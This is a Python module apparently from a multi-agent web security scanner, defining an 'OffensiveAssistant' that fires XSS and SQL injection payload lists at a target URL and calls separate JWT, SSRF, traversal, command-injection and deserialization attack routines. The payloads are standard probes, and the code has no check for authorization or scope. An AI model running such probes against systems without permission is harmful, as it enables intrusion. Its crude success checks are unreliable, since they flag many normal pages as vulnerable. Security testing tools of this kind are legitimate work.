from .base_assistant import BaseAssistant, ReasoningStep, VisualizationType
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass
import json
from bs4 import BeautifulSoup
import re
from .offensive_tools import OffensiveTools, ExploitResult
import networkx as nx
from datetime import datetime

@dataclass
class AttackResult:
    success: bool
    vector: str
    details: str
    payload: str
    response: Optional[str]
    timestamp: datetime = datetime.now()

class OffensiveAssistant(BaseAssistant):
    def __init__(self, message_bus):
        super().__init__(message_bus)
        self.session = None
        self.attack_vectors = []
        self.successful_attacks = []
        self.current_target = None
        self.tools = OffensiveTools()
        self.attack_graph = nx.DiGraph()
        self.current_attack_id = None

    async def initialize(self):
        """Initialize offensive capabilities"""
        self.session = aiohttp.ClientSession()
        await self.tools.initialize()
        
        init_step = ReasoningStep(
            step_id="offensive_init",
            description="Initializing offensive capabilities",
            visualization_type=VisualizationType.DEPENDENCY_MAP,
            data=self._get_offensive_capabilities()
        )
        await self.log_reasoning_step(init_step)
        
        await self.publish_discovery({
            "component": "offensive_assistant",
            "status": "initialized",
            "capabilities": self._get_attack_capabilities()
        })

    async def run(self, target: str, aggressiveness: int = 5, stealth_mode: bool = False) -> Dict[str, Any]:
        """Execute offensive operations"""
        try:
            self.current_target = target
            self.current_attack_id = f"attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Initial attack surface visualization
            surface_step = ReasoningStep(
                step_id=f"{self.current_attack_id}_surface",
                description="Analyzing attack surface",
                visualization_type=VisualizationType.ATTACK_GRAPH,
                data={"target": target, "mode": "initial"}
            )
            await self.log_reasoning_step(surface_step)

            results = {}
            
            # Request collaboration for attack strategy
            await self.request_collaboration('attack_strategy', {
                'target': target,
                'aggressiveness': aggressiveness,
                'stealth_mode': stealth_mode
            })

            # Basic attacks
            if not stealth_mode:
                xss_results = await self._advanced_xss_detection(target)
                results['xss_attacks'] = xss_results
                
                sqli_results = await self._advanced_sqli_detection(target)
                results['sqli_attacks'] = sqli_results
            
            # Advanced attacks if aggressive
            if aggressiveness > 3:
                advanced_step = ReasoningStep(
                    step_id=f"{self.current_attack_id}_advanced",
                    description="Executing advanced attacks",
                    visualization_type=VisualizationType.ATTACK_GRAPH,
                    data={"phase": "advanced", "target": target}
                )
                await self.log_reasoning_step(advanced_step)
                
                results.update({
                    'jwt_attacks': await self.tools.jwt_attacks(target),
                    'traversal_attacks': await self.tools.directory_traversal(target),
                    'ssrf_attacks': await self.tools.ssrf_attacks(target),
                    'injection_attacks': await self.tools.command_injection(target),
                    'deserialization': await self.tools.deserialization_attacks(target)
                })

            # Generate and share final report
            report = self._generate_attack_report(results)
            
            # Final visualization
            final_step = ReasoningStep(
                step_id=f"{self.current_attack_id}_final",
                description="Attack execution complete",
                visualization_type=VisualizationType.VULNERABILITY_MATRIX,
                data=self._prepare_results_visualization(results)
            )
            await self.log_reasoning_step(final_step)
            
            return {"results": results, "report": report}
            
        except Exception as e:
            error_step = ReasoningStep(
                step_id=f"{self.current_attack_id}_error",
                description=f"Error in offensive operations: {str(e)}",
                visualization_type=VisualizationType.FLOW_DIAGRAM,
                data={"error": str(e), "state": "failed"}
            )
            await self.log_reasoning_step(error_step)
            raise

    async def close(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
        await self.tools.close()

    async def update_strategy(self, strategy_data: Dict[str, Any]):
        """Update offensive strategy based on new information"""
        strategy_step = ReasoningStep(
            step_id=f"{self.current_attack_id}_strategy_update",
            description="Updating offensive strategy",
            visualization_type=VisualizationType.FLOW_DIAGRAM,
            data=strategy_data
        )
        await self.log_reasoning_step(strategy_step)
        
        # Adjust attack vectors based on new strategy
        await self._adjust_attack_vectors(strategy_data)

    async def _advanced_xss_detection(self, url: str) -> List[AttackResult]:
        """Advanced XSS detection with context-aware payloads"""
        xss_step = ReasoningStep(
            step_id=f"{self.current_attack_id}_xss",
            description="Executing XSS attacks",
            visualization_type=VisualizationType.ATTACK_GRAPH,
            data={"type": "xss", "target": url}
        )
        await self.log_reasoning_step(xss_step)
        
        results = []
        contexts = {
            "html": [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
            ],
            "javascript": [
                "';alert(1);//",
                "\";alert(1);//",
                "javascript:alert(1)//",
            ],
            "attribute": [
                "\" onmouseover=\"alert(1)",
                "' onfocus='alert(1)",
                "\" autofocus onfocus=\"alert(1)",
            ],
            "css": [
                "}</style><script>alert(1)</script>",
                "expression(alert(1))",
                "behavior:url(javascript:alert(1))",
            ]
        }
        
        for context, payloads in contexts.items():
            for payload in payloads:
                try:
                    injection_points = [
                        f"{url}?q={payload}",
                        f"{url}#{payload}",
                        f"{url}",
                    ]
                    
                    for injection_point in injection_points:
                        async with self.session.get(injection_point) as response:
                            content = await response.text()
                            if self._verify_xss_success(content, payload):
                                result = AttackResult(
                                    success=True,
                                    vector=f"XSS ({context})",
                                    details=f"XSS vulnerability found in {context} context",
                                    payload=payload,
                                    response=content[:200]
                                )
                                results.append(result)
                                
                                await self.publish_vulnerability({
                                    "type": "xss",
                                    "context": context,
                                    "payload": payload,
                                    "severity": "high",
                                    "priority": 4
                                })
                                
                except Exception as e:
                    await self.publish_alert({
                        "type": "xss_error",
                        "context": context,
                        "error": str(e),
                        "priority": 3
                    })
        
        return results

    async def _advanced_sqli_detection(self, url: str) -> List[AttackResult]:
        """Advanced SQL injection detection with error analysis"""
        sqli_step = ReasoningStep(
            step_id=f"{self.current_attack_id}_sqli",
            description="Executing SQL injection attacks",
            visualization_type=VisualizationType.ATTACK_GRAPH,
            data={"type": "sqli", "target": url}
        )
        await self.log_reasoning_step(sqli_step)
        
        results = []
        payloads = {
            "error_based": [
                "' OR '1'='1",
                "' AND 1=convert(int,@@version)--",
                "' AND 1=ctxsys.drithsx.sn(1,2)--",
            ],
            "boolean_based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 'a'='a",
            ],
            "time_based": [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
            ]
        }
        
        for technique, technique_payloads in payloads.items():
            for payload in technique_payloads:
                try:
                    start_time = datetime.now()
                    async with self.session.get(f"{url}?id={payload}") as response:
                        content = await response.text()
                        elapsed = (datetime.now() - start_time).total_seconds()
                        
                        if self._verify_sqli_success(content, technique, elapsed):
                            result = AttackResult(
                                success=True,
                                vector=f"SQLi ({technique})",
                                details=f"SQL injection vulnerability found using {technique}",
                                payload=payload,
                                response=content[:200]
                            )
                            results.append(result)
                            
                            await self.publish_vulnerability({
                                "type": "sql_injection",
                                "technique": technique,
                                "payload": payload,
                                "severity": "critical",
                                "priority": 5
                            })
                            
                except Exception as e:
                    await self.publish_alert({
                        "type": "sqli_error",
                        "technique": technique,
                        "error": str(e),
                        "priority": 3
                    })
        
        return results

    def _verify_xss_success(self, content: str, payload: str) -> bool:
        """Verify if XSS payload was successful"""
        if payload in content:
            return True
        
        success_markers = [
            "alert(1)",
            "onload=",
            "onerror=",
            "javascript:",
        ]
        return any(marker in content for marker in success_markers)

    def _verify_sqli_success(self, content: str, technique: str, elapsed: float) -> bool:
        """Verify if SQL injection was successful"""
        if technique == "error_based":
            error_patterns = [
                "SQL syntax",
                "mysql_fetch",
                "ORA-01756",
                "SQL Server",
                "PostgreSQL",
            ]
            return any(pattern.lower() in content.lower() for pattern in error_patterns)
            
        elif technique == "boolean_based":
            return len(content) > 4096
            
        elif technique == "time_based":
            return elapsed >= 5
            
        return False

    def _get_offensive_capabilities(self) -> Dict[str, Any]:
        """Get offensive component dependencies for visualization"""
        return {
            "nodes": [
                {"id": "xss", "type": "attack"},
                {"id": "sqli", "type": "attack"},
                {"id": "jwt", "type": "attack"},
                {"id": "ssrf", "type": "attack"},
                {"id": "injection", "type": "attack"}
            ],
            "edges": [
                {"source": "xss", "target": "injection"},
                {"source": "sqli", "target": "injection"},
                {"source": "jwt", "target": "injection"},
                {"source": "ssrf", "target": "injection"}
            ]
        }

    def _get_attack_capabilities(self) -> List[str]:
        """Get list of attack capabilities"""
        return [
            "XSS Detection",
            "SQL Injection",
            "JWT Attacks",
            "Directory Traversal",
            "SSRF Attacks",
            "Command Injection",
            "Deserialization Attacks"
        ]

    def _prepare_results_visualization(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Prepare results for visualization"""
        return {
            "successful_attacks": len([r for r in results.values() if isinstance(r, list) and any(a.success for a in r)]),
            "attack_vectors": len(self.attack_vectors),
            "vulnerability_types": list(results.keys()),
            "risk_levels": self._calculate_risk_levels(results)
        }

    def _calculate_risk_levels(self, results: Dict[str, Any]) -> Dict[str, int]:
        """Calculate risk levels from results"""
        risk_levels = {
            "critical": 0,
            "high": 0,
            "medium": 0,
            "low": 0
        }
        
        for attack_type, attack_results in results.items():
            if isinstance(attack_results, list):
                for result in attack_results:
                    if result.success:
                        if "sql" in attack_type.lower():
                            risk_levels["critical"] += 1
                        elif "xss" in attack_type.lower():
                            risk_levels["high"] += 1
                        else:
                            risk_levels["medium"] += 1
        
        return risk_levels

    async def _adjust_attack_vectors(self, strategy_data: Dict[str, Any]):
        """Adjust attack vectors based on strategy"""
        # Implementation specific to attack vector adjustment
        pass